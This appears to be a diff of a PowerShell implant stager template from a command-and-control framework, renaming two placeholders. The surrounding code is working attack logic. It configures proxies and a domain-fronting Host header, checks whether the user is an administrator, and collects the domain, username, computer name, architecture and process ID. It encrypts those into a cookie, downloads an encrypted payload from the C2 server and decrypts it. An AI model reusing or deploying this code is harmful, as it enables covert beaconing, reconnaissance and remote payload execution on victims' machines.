@@ -47,7 +47,7 @@ $username = "#REPLACEPROXYUSER#"
 $password = "#REPLACEPROXYPASS#"
 $proxyurl = "#REPLACEPROXYURL#"
 $wc = New-Object System.Net.WebClient;
-#REPLACEPROXY#
+#REPLACEPROXYCOMMAND#
 $h="#REPLACEDOMAINFRONT#"
 if ($h -and (($psversiontable.CLRVersion.Major -gt 2))) {$wc.Headers.Add("Host",$h)}
 elseif($h){$script:s="https://$($h)#REPLACECONNECT#";$script:sc="https://$($h)"}
@@ -71,7 +71,7 @@ $wp = New-Object System.Security.Principal.WindowsPrincipal($cu)
 $ag = [System.Security.Principal.WindowsBuiltInRole]::Administrator
 if ($wp.IsInRole($ag)){$el="*"}else{$el=""}
 try{$u=($cu).name+$el} catch{if ($env:username -eq "$($env:computername)$"){}else{$u=$env:username}}
-$o="$env:userdomain;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;#REPLACEHOSTPORT#"
+$o="$env:userdomain;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;#REPLACEURLID#"
 try {$pp=enc -key #REPLACEKEY# -un $o} catch {$pp="ERROR"}
 $primer = (Get-Webclient -Cookie $pp).downloadstring($s)
 $p = dec -key #REPLACEKEY# -enc $primer
